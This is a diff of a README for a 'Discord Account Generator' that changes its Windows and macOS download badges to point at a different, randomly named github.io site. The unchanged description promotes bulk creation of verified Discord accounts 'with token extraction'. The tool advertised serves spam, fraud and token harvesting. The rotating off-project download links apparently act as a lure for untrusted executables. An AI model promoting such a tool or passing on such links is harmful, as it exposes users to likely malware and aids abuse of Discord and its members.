@@ -1,7 +1,7 @@
 # Discord Account Generator
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hydracomptrollercord.github.io/MacDownloader/)
 
 High-speed Discord account generator with token extraction. Generates verified Discord accounts with phone/email verification support.
 
